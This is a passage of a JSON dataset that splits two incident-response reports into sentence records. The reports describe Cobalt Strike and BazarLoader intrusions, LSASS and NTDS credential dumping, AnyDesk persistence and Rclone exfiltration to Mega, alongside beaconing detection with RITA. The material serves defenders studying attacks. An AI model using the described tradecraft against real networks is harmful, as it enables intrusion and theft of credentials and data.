        "id": "dfir-reports-filtered/r-dfir-22.md:::S82",
        "text": "Threat actors also pivoted to a domain controller by using the same Cobalt Strike artifacts, spoolsv.exe via remote service creation:\n",
        "type": "",
        "report": "r-dfir-22",
        "line": 82,
        "index": 6005
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S83",
        "text": "Right after initial Lateral Movement, a second Cobalt Strike Beacon kaslose64.dll was executed on a critical server.",
        "type": "",
        "report": "r-dfir-22",
        "line": 83,
        "index": 6006
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S84",
        "text": "Rita stands for Real Intelligence Threat Analytics (RITA), developed by Active Countermeasures.",
        "type": "",
        "report": "r-dfir-22",
        "line": 84,
        "index": 6007
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S85",
        "text": "Rita is a framework for identifying command and control communication, also known as beaconing.",
        "type": "",
        "report": "r-dfir-22",
        "line": 85,
        "index": 6008
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S86",
        "text": "As the name implies, beaconing refers to delivering regular messages from an infected host to an attacker-controlled host.",
        "type": "",
        "report": "r-dfir-22",
        "line": 86,
        "index": 6009
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S87",
        "text": "Beacon is the malware agent installed on the victim\u2019s device and is responsible for communicating with the C2 server.",
        "type": "",
        "report": "r-dfir-22",
        "line": 87,
        "index": 6010
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S88",
        "text": "Rita is consuming zeek/bro logs and detecting suspected beaconing activity using network traffic calculations.",
        "type": "",
        "report": "r-dfir-22",
        "line": 88,
        "index": 6011
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S89",
        "text": "It then assigns a value ranging from 0.1 to 1.0, with the greater the score indicating that the network activity is suspicious.",
        "type": "",
        "report": "r-dfir-22",
        "line": 89,
        "index": 6012
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S90",
        "text": "Rita is utilized as a hunting tool rather than a real-time detection tool, though simple scripting allows Rita to be used for live traffic analysis.",
        "type": "",
        "report": "r-dfir-22",
        "line": 90,
        "index": 6013
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S91",
        "text": "However, analysts should add additional context and filter the results accordingly.",
        "type": "",
        "report": "r-dfir-22",
        "line": 91,
        "index": 6014
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S92",
        "text": "Rita can only identify suspicious communication and should not be automated as a preventative control.",
        "type": "",
        "report": "r-dfir-22",
        "line": 92,
        "index": 6015
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S93",
        "text": "For more info on how RITA works check out the mathamatics here.\n",
        "type": "",
        "report": "r-dfir-22",
        "line": 93,
        "index": 6016
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S94",
        "text": "Using with this case network traffic RITA was able to identify all active Beacons from the impacted hosts in the network as seen in the screenshot below:\n",
        "type": "",
        "report": "r-dfir-22",
        "line": 94,
        "index": 6017
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S95",
        "text": "The following Cobalt Strike server was added to our Threat Feed on 07/26/2021.\n",
        "type": "",
        "report": "r-dfir-22",
        "line": 95,
        "index": 6018
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S96",
        "text": "This Cobalt Strike server was added to our Threat Feed on 07/27/2021.\n",
        "type": "",
        "report": "r-dfir-22",
        "line": 96,
        "index": 6019
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S97",
        "text": "No exfiltration TTPs were observed while analyzing this intrusion, however, as stated in the case summary, it is possible that the threat actors used Cobalt Strike (encrypted channel) to transmit sensitive data such as Word documents.",
        "type": "",
        "report": "r-dfir-22",
        "line": 97,
        "index": 6020
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S98",
        "text": "The ransomware was executed on multiple servers using a batch script start.bat:\n",
        "type": "",
        "report": "r-dfir-22",
        "line": 98,
        "index": 6021
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S99",
        "text": "Here is the first ransomware execution which was observed on the Domain Controller:\n",
        "type": "",
        "report": "r-dfir-22",
        "line": 99,
        "index": 6022
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S100",
        "text": "enter image description here\n",
        "type": "",
        "report": "r-dfir-22",
        "line": 100,
        "index": 6023
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S101",
        "text": "Below is another example of the ransomware execution on one of the external servers:\n",
        "type": "",
        "report": "r-dfir-22",
        "line": 101,
        "index": 6024
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S102",
        "text": "enter image description here\n",
        "type": "",
        "report": "r-dfir-22",
        "line": 102,
        "index": 6025
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S103",
        "text": "Once the encryption process was complete a file called RecoveryManual.html was left across the filesystem with the instructions on how to contact the threat actors for the ransom negotiations.\n",
        "type": "",
        "report": "r-dfir-22",
        "line": 103,
        "index": 6026
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S0",
        "text": "In this case, we did not see the exact initial access vector but based on other reports at the time we assess with medium to high confidence a malicious email campaign delivering macro enabled Word documents was the delivery vector.",
        "type": "",
        "report": "r-dfir-23",
        "line": 0,
        "index": 6027
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S1",
        "text": "Shortly after the initial BazarLoader execution, we observed the first discovery commands using the standard built in Microsoft utilities (net view, net group, nltest).",
        "type": "",
        "report": "r-dfir-23",
        "line": 1,
        "index": 6028
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S2",
        "text": "We saw the BazarLoader process download and execute the first Cobalt Strike beacon twenty minutes later using rundll32.\n",
        "type": "",
        "report": "r-dfir-23",
        "line": 2,
        "index": 6029
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S3",
        "text": "As the operators tried to enumerate the network, they miss-typed a lot of their commands.",
        "type": "",
        "report": "r-dfir-23",
        "line": 3,
        "index": 6030
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S4",
        "text": "During interactive discovery tasks via the Cobalt Strike beacon, the threat actors attempted an unusual command that had us scratching our heads for awhile, \u201cav_query\u201d.",
        "type": "",
        "report": "r-dfir-23",
        "line": 4,
        "index": 6031
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S5",
        "text": "This left us confused, we were not aware of the reason and/or the purpose of this command.",
        "type": "",
        "report": "r-dfir-23",
        "line": 5,
        "index": 6032
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S6",
        "text": "On August 5th, a threat actor that goes with the name \u201cm1Geelka\u201d, leaked multiple documents that contained instructions, tools and, \u201ctraining\u201d materials to be used by affiliates of Conti ransomware.",
        "type": "",
        "report": "r-dfir-23",
        "line": 6,
        "index": 6033
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S7",
        "text": "We demonstrated some of the documents on one of our recent tweet threads, more info about the Conti leak here.",
        "type": "",
        "report": "r-dfir-23",
        "line": 7,
        "index": 6034
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S8",
        "text": "In these materials, we found a file called \u201cAVquery.cna\u201d that refers to a Cobalt Strike aggressor script for identifying AV on the target systems.",
        "type": "",
        "report": "r-dfir-23",
        "line": 8,
        "index": 6035
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S9",
        "text": "It is likely that the threat actors in this intrusion meant to use this aggressor script via their Cobalt Strike console, but instead typed or pasted \u201cav_query\u201d into their windows command prompt session.",
        "type": "",
        "report": "r-dfir-23",
        "line": 9,
        "index": 6036
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S10",
        "text": "Additionally, threat actors were seen following the instructions of the leaked documents step by step.",
        "type": "",
        "report": "r-dfir-23",
        "line": 10,
        "index": 6037
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S11",
        "text": "More specifically, we observed the threat actors copy/pasting the exact commands such as creating local admin users that contained the same passwords we saw in the leaked instructions.",
        "type": "",
        "report": "r-dfir-23",
        "line": 11,
        "index": 6038
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S12",
        "text": "Continuing with the discovery phase, the threat actors executed AdFind via a batch script before further enumerating using native Windows tools and port scanning via the Cobalt Strike beacon.",
        "type": "",
        "report": "r-dfir-23",
        "line": 12,
        "index": 6039
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S13",
        "text": "They then successfully escalated privileges by dumping credentials from the LSASS process.",
        "type": "",
        "report": "r-dfir-23",
        "line": 13,
        "index": 6040
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S14",
        "text": "After having enough situational awareness over the domain and an administrator\u2019s account in their possession, operators used a reverse proxy and established a RDP connection on the beachhead host.",
        "type": "",
        "report": "r-dfir-23",
        "line": 14,
        "index": 6041
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S15",
        "text": "Moments later, we observed them move laterally for the first time to the Domain Controller using RDP.",
        "type": "",
        "report": "r-dfir-23",
        "line": 15,
        "index": 6042
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S16",
        "text": "Once on the Domain Controller, they again downloaded and executed AdFind through the same batch script.",
        "type": "",
        "report": "r-dfir-23",
        "line": 16,
        "index": 6043
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S17",
        "text": "They also ran two separate Cobalt Strike beacons.",
        "type": "",
        "report": "r-dfir-23",
        "line": 17,
        "index": 6044
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S18",
        "text": "As if their presence was not enough with Cobalt Strike and administrator credentials, they proceeded with creating two local administrator accounts.",
        "type": "",
        "report": "r-dfir-23",
        "line": 18,
        "index": 6045
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S19",
        "text": "Next, they installed AnyDesk, a remote access application for RDP connectivity and remote system control.",
        "type": "",
        "report": "r-dfir-23",
        "line": 19,
        "index": 6046
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S20",
        "text": "After having four different types of persistence, they felt it was enough and continued enumerating the network, only this time, they searched for valuable documents across all domain-joined hosts.",
        "type": "",
        "report": "r-dfir-23",
        "line": 20,
        "index": 6047
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S21",
        "text": "To accomplish that, they used PowerSploit and, more specifically, the \u201cInvoke-ShareFinder\u201d module.",
        "type": "",
        "report": "r-dfir-23",
        "line": 21,
        "index": 6048
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S22",
        "text": "While waiting for their script to finish, the threat actors created a full backup of active directory in \u201cIFM\u201d media mode and dumped the password hashes along with the corresponding users.",
        "type": "",
        "report": "r-dfir-23",
        "line": 22,
        "index": 6049
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S23",
        "text": "This method is both stealthier and safer for extracting the hashes from active directory, as explained by Black Hills Information Security.\n",
        "type": "",
        "report": "r-dfir-23",
        "line": 23,
        "index": 6050
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S24",
        "text": "The next step for the threat actors was to download and run \u201cAdvanced IP Scanner\u201d and scanned for ranges looking for other active subnets on the LAN.",
        "type": "",
        "report": "r-dfir-23",
        "line": 24,
        "index": 6051
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S25",
        "text": "After four hours of downtime, the operators returned to the network and did something unexpected; they used seatbelt to enumerate the domain controller further.",
        "type": "",
        "report": "r-dfir-23",
        "line": 25,
        "index": 6052
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S26",
        "text": "They then pivoted over to another domain controller, repeated all the above discovery steps, and ran the same tools as on the first domain controller.\n",
        "type": "",
        "report": "r-dfir-23",
        "line": 26,
        "index": 6053
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S27",
        "text": "Eventually, this intrusion ended on the third day from the initial BazarLoader execution.",
        "type": "",
        "report": "r-dfir-23",
        "line": 27,
        "index": 6054
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S28",
        "text": "After almost a day of inactivity, the operators logged into the network and used RDP to remote into file servers that contained valuable data.",
        "type": "",
        "report": "r-dfir-23",
        "line": 28,
        "index": 6055
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S29",
        "text": "They then created a directory called Shares$ and used Rclone to exfiltrate the data to the Mega Fileshare service.",
        "type": "",
        "report": "r-dfir-23",
        "line": 29,
        "index": 6056
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S30",
        "text": "Typically, these types of cases end up with Conti ransomware, however, the threat actors were evicted from the network before a final suspected ransomware deployment commenced.\n",
        "type": "",
        "report": "r-dfir-23",
        "line": 30,
        "index": 6057
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S31",
        "text": "We assess with medium to high confidence that the initial access was a result of malicious, macro-enabled, Word document that was sent as an attachment to the targets of a phishing campaign.",
        "type": "",
        "report": "r-dfir-23",
        "line": 31,
        "index": 6058
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S32",
        "text": "Brad reported on similar BazarLoader activity initiated from malicious TA551 Word Doc email campaign that resulted in Cobalt Strike beacons.",
        "type": "",
        "report": "r-dfir-23",
        "line": 32,
        "index": 6059
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S33",
        "text": "The initial execution for this intrusion took place with the use of BazarLoader malware via rundll32.\n",
        "type": "",
        "report": "r-dfir-23",
        "line": 33,
        "index": 6060
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S34",
        "text": "Immediately after the execution, the malware contacted two of its C2 IPs:\n",
        "type": "",
        "report": "r-dfir-23",
        "line": 34,
        "index": 6061
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S35",
        "text": "We then observed the threat actor using the BazarLoader injected process, svchost.exe, to download Cobalt Strike and save it under:\n",
        "type": "",
        "report": "r-dfir-23",
        "line": 35,
        "index": 6062
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S36",
        "text": "before executing it using rundll32.exe.\n",
        "type": "",
        "report": "r-dfir-23",
        "line": 36,
        "index": 6063
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S37",
        "text": "Throughout the intrusion, the threat actors utilized Cobalt Strike beacons and PowerShell to execute their payloads prior to interactively remoting into hosts using RDP and AnyDesk.\n",
        "type": "",
        "report": "r-dfir-23",
        "line": 37,
        "index": 6064
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S38",
        "text": "The threat actors created two local user accounts on the first Domain Controller.",
        "type": "",
        "report": "r-dfir-23",
        "line": 38,
        "index": 6065
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S39",
        "text": "They also added one of the two to the local administrators group.",
        "type": "",
        "report": "r-dfir-23",
        "line": 39,
        "index": 6066
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S40",
        "text": "The passwords that they used were the same as the passwords of the recent Conti leaked documents.\n",
        "type": "",
        "report": "r-dfir-23",
        "line": 40,
        "index": 6067
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S41",
        "text": "Screenshot from leaked Conti data (\u201c\u0417\u0430\u043a\u0440\u0435\u043f\\ AnyDesk.txt\u201d) (our tweet thread on Conti leak manuals):\n",
        "type": "",
        "report": "r-dfir-23",
        "line": 41,
        "index": 6068
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S42",
        "text": "Commands from the intrusion:\n",
        "type": "",
        "report": "r-dfir-23",
        "line": 42,
        "index": 6069
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S43",
        "text": "AnyDesk was also installed on the main domain controller.\n",
        "type": "",
        "report": "r-dfir-23",
        "line": 43,
        "index": 6070
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S44",
        "text": "The threat actors maintained an open communication channel through AnyDesk for a period of 11 hours.\n",
        "type": "",
        "report": "r-dfir-23",
        "line": 44,
        "index": 6071
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S45",
        "text": "The threat actor was seen logging in from 185.220.100.242 (Tor Exit Node) using AnyDesk.",
        "type": "",
        "report": "r-dfir-23",
        "line": 45,
        "index": 6072
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S46",
        "text": "Client ID 776934005.",
        "type": "",
        "report": "r-dfir-23",
        "line": 46,
        "index": 6073
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S47",
        "text": "(ad_svc.trace)",
        "type": "",
        "report": "r-dfir-23",
        "line": 47,
        "index": 6074
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S48",
        "text": "The threat actors accessed credentials for an administrator account from the LSASS process using the Cobalt Strike beacon.",
        "type": "",
        "report": "r-dfir-23",
        "line": 48,
        "index": 6075
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S49",
        "text": "On the image below, we can see that the CS beacon process is injected into LSASS.\n",
        "type": "",
        "report": "r-dfir-23",
        "line": 49,
        "index": 6076
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S50",
        "text": "Throughout the intrusion, we observed multiple instances of process injection from both the initial BazarLoader malware and Cobalt Strike beacons.",
        "type": "",
        "report": "r-dfir-23",
        "line": 50,
        "index": 6077
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S51",
        "text": "After BazarLoader was loaded in memory, almost immediately it injected into svchost.exe process.",
        "type": "",
        "report": "r-dfir-23",
        "line": 51,
        "index": 6078
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S52",
        "text": "Additionally, the Cobalt Strike beacon was injected into mstsc.exe, searchindexer.exe and rundll32.exe and run various tasks from these processes.\n",
        "type": "",
        "report": "r-dfir-23",
        "line": 52,
        "index": 6079
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S53",
        "text": "The LSASS process was accessed by an unusual process \u201csearchindexer.exe\u201d on beachhead right before the lateral movement was observed.",
        "type": "",
        "report": "r-dfir-23",
        "line": 53,
        "index": 6080
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S54",
        "text": "Searchindexer.exe is a legitimate Windows process responsible for the indexing of files or Windows searches.",
        "type": "",
        "report": "r-dfir-23",
        "line": 54,
        "index": 6081
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S55",
        "text": "This technique is known to be used by Cobaltstrike which inject malicious code into a newly spawned searchindexer process to evade detection.",
        "type": "",
        "report": "r-dfir-23",
        "line": 55,
        "index": 6082
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S56",
        "text": "This is associated with MITRE ATT&CK (r) Tactic(s): Defense Evasion and Technique(s): T1036.004.\n",
        "type": "",
        "report": "r-dfir-23",
        "line": 56,
        "index": 6083
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S57",
        "text": "The Sysmon logs captured in our case below can be used to detect this type of activity.\n",
        "type": "",
        "report": "r-dfir-23",
        "line": 57,
        "index": 6084
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S58",
        "text": "The threat actors created a full backup of the active directory in \u201cIFM\u201d media mode and dumped the password hashes along with the corresponding users.\n",
        "type": "",
        "report": "r-dfir-23",
        "line": 58,
        "index": 6085
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S59",
        "text": "They also employed the NtdsAudit tool immediately after using NTDSutil to dump the password hashes of all domain users.",
        "type": "",
        "report": "r-dfir-23",
        "line": 59,
        "index": 6086
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S60",
        "text": "NtdsAudit requires the \u201cntds.dit\u201d database file and SYSTEM registry file for extracting the password hashes and usernames.",
        "type": "",
        "report": "r-dfir-23",
        "line": 60,
        "index": 6087
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S61",
        "text": "After providing these as arguments, they exported the password hashes in a file that they named \u201cpwdump.txt\u201d and the user details in a csv file called \u201cusers.csv\u201d.",
        "type": "",
        "report": "r-dfir-23",
        "line": 61,
        "index": 6088
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S62",
        "text": "After obtaining the password hashes, the threat actors can crack the passwords hashes using a program such as hashcat.\n",
        "type": "",
        "report": "r-dfir-23",
        "line": 62,
        "index": 6089
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S63",
        "text": "A few minutes after the initial execution, BazarLoader ran some discovery tasks using the built in Microsoft net and nltest utilities and transferred the results over the C2 channel.",
        "type": "",
        "report": "r-dfir-23",
        "line": 63,
        "index": 6090
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S64",
        "text": "Later on, hands-on operators carried out some additional network and domain reconnaissance from the Cobalt Strike beacon.",
        "type": "",
        "report": "r-dfir-23",
        "line": 64,
        "index": 6091
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S65",
        "text": "Again, built in utilities were favored, with the exception of what we assess was a fat finger or miss-paste by the threat actor entering a command they meant to execute in their Cobalt Strike console into the windows command terminal.",
        "type": "",
        "report": "r-dfir-23",
        "line": 65,
        "index": 6092
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S66",
        "text": "The threat actors executed AdFind multiple times on both the beachhead and the domain controllers through a well-known script called adf.bat.\n",
        "type": "",
        "report": "r-dfir-23",
        "line": 66,
        "index": 6093
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S67",
        "text": "Later on, during the first day of the intrusion, and before we saw the threat actors pivot laterally to the domain controller, they ensured the information that they had collected was accurate by running the below enumeration commands:\n",
        "type": "",
        "report": "r-dfir-23",
        "line": 67,
        "index": 6094
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S68",
        "text": "Threat actor dropped and ran a script named ping.bat.",
        "type": "",
        "report": "r-dfir-23",
        "line": 68,
        "index": 6095
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S69",
        "text": "Here\u2019s an example:\n",
        "type": "",
        "report": "r-dfir-23",
        "line": 69,
        "index": 6096
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S70",
        "text": "The threat actors utilized Advanced IP Scanner to the scan for open ports.",
        "type": "",
        "report": "r-dfir-23",
        "line": 70,
        "index": 6097
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S71",
        "text": "One of the first things that the attackers did once on the first domain controller, was to execute Invoke-ShareFinder from PowerSploit via PowerShell ISE.",
        "type": "",
        "report": "r-dfir-23",
        "line": 71,
        "index": 6098
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S72",
        "text": "They did the same thing later, on the second domain controller.\n",
        "type": "",
        "report": "r-dfir-23",
        "line": 72,
        "index": 6099
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S73",
        "text": "Other Microsoft AD management PowerShell administration modules were also invoked by the threat actors for discovery tasks.\n",
        "type": "",
        "report": "r-dfir-23",
        "line": 73,
        "index": 6100
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S74",
        "text": "Get-ADDomainController Get-ADDomainController -Filter * | ft Get-ADComputer -Filter * -Properties * | Get-Member Get-ADDomain\n",
        "type": "",
        "report": "r-dfir-23",
        "line": 74,
        "index": 6101
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S75",
        "text": "From the Domain Controller the threat actor also ran a Seatbelt binary, which was also seen in the Conti leak documents.",
        "type": "",
        "report": "r-dfir-23",
        "line": 75,
        "index": 6102
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S76",
        "text": "This utility contains a number of \u201csafety checks\u201d on a host, telling the user about things like installed AV, network drives, local users, and much more.\n",
        "type": "",
        "report": "r-dfir-23",
        "line": 76,
        "index": 6103
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S77",
        "text": "We also noticed the threat actors searching for any existing antivirus software on the domain controller.",
        "type": "",
        "report": "r-dfir-23",
        "line": 77,
        "index": 6104
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S78",
        "text": "They ran \u201cdir\u201d on the \u201cc:\\Program Files\\\u201d folder and saved the findings in the AV.txt file using a script named av.bat The script looked similar to the below:\n",
        "type": "",
        "report": "r-dfir-23",
        "line": 78,
        "index": 6105
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S79",
        "text": "Many hours after the initial compromise, we observed the threat actors using RDP to connect to the first domain controller.",
        "type": "",
        "report": "r-dfir-23",
        "line": 79,
        "index": 6106
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S80",
        "text": "They used reverse proxy via the Cobalt Strike C2 to initiate the RDP connection and for that reason, the operator\u2019s real hostname was captured in event ID 4624:\n",
        "type": "",
        "report": "r-dfir-23",
        "line": 80,
        "index": 6107
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S81",
        "text": "Prior to exfiltrating the data, operators staged them under a directory called \u201cShares\u201d on each file server.",
        "type": "",
        "report": "r-dfir-23",
        "line": 81,
        "index": 6108
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S82",
        "text": "They then inspected the documents they collected prior to exfiltrating them over to Mega storage servers using the Rclone application.\n",
        "type": "",
        "report": "r-dfir-23",
        "line": 82,
        "index": 6109
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S83",
        "text": "BazarLoader initial communication with the C2 is over HTTPS.",
        "type": "",
        "report": "r-dfir-23",
        "line": 83,
        "index": 6110
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S84",
        "text": "Data is sent to the C2 via the cookie parameter(screenshot taken from https://tria.ge/210716-v4jh8hf6ea/behavioral2).\n",
        "type": "",
        "report": "r-dfir-23",
        "line": 84,
        "index": 6111
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S85",
        "text": "Twenty minutes after the initial execution, BazarLoader downloaded and executed Cobalt Strike beacon with the help of rundll32.exe.\n",
        "type": "",
        "report": "r-dfir-23",
        "line": 85,
        "index": 6112
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S86",
        "text": "The AnyDesk software installed by the threat actors maintained a constant connection to the Anydesk infrastructure for the duration of the intrusion.\n",
        "type": "",
        "report": "r-dfir-23",
        "line": 86,
        "index": 6113
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S87",
        "text": "Some network oddities appeared several times during the course of the intrusion.",
        "type": "",
        "report": "r-dfir-23",
        "line": 87,
        "index": 6114
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S88",
        "text": "One of those oddities was several connections across the intrusion to an XMPP chat server at chatterboxtown.us at 70.35.205.161.",
        "type": "",
        "report": "r-dfir-23",
        "line": 88,
        "index": 6115
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S89",
        "text": "These connections originated from one of the Cobalt Strike processes over port 5222.",
        "type": "",
        "report": "r-dfir-23",
        "line": 89,
        "index": 6116
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S90",
        "text": "The goal of this traffic was not discovered in the course of the investigation.",
        "type": "",
        "report": "r-dfir-23",
        "line": 90,
        "index": 6117
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S91",
        "text": "Another, was a brief SSH connection to a server on the internet using Putty.\n",
        "type": "",
        "report": "r-dfir-23",
        "line": 91,
        "index": 6118
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S92",
        "text": "The connection took place for a period of twenty minutes.",
        "type": "",
        "report": "r-dfir-23",
        "line": 92,
        "index": 6119
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S93",
        "text": "The reason for this connection is unknown.",
        "type": "",
        "report": "r-dfir-23",
        "line": 93,
        "index": 6120
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S94",
        "text": "According to public records, the IP is associated with an old Cobalt Strike C2 server.\n",
        "type": "",
        "report": "r-dfir-23",
        "line": 94,
        "index": 6121
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S95",
        "text": "As the threat actors were perusing files, we received a notification that one of our files had been remotely opened from 46.38.235.14.\n",
        "type": "",
        "report": "r-dfir-23",
        "line": 95,
        "index": 6122
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S96",
        "text": "The threat actors later exfiltrated sensitive documents from domain joined file servers using the Rclone application.",
        "type": "",
        "report": "r-dfir-23",
        "line": 96,
        "index": 6123
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S97",
        "text": "The destination of the exfiltrated data was Mega.io.\n",
        "type": "",
        "report": "r-dfir-23",
        "line": 97,
        "index": 6124
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S98",
        "text": "The above command was copied and pasted by the threat actors to exfiltrate the data.",
        "type": "",
        "report": "r-dfir-23",
        "line": 98,
        "index": 6125
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S99",
        "text": "Prior to the correct command, the threat actors accidentally pasted a command from a previous intrusion.",
        "type": "",
        "report": "r-dfir-23",
        "line": 99,
        "index": 6126
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S100",
        "text": "That command contained a different victim organization in the arguments showing through out the intrusion continued sloppiness of the threat actor.\n",
        "type": "",
        "report": "r-dfir-23",
        "line": 100,
        "index": 6127
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S101",
        "text": "Breaking down the Rclone command line arguments:\n",
        "type": "",
        "report": "r-dfir-23",
        "line": 101,
        "index": 6128
    },
    {
        "id": "dfir-reports-filtered/r-dfir-23.md:::S102",
        "text": "A great reference for detecting Rclone data exfiltration is the article from nccgroup: Detecting Rclone \u2013 An Effective Tool for Exfiltration \u2013 and from Red Canary \u2013 Transferring Leverage in a Ransomware Attack.\n",
        "type": "",
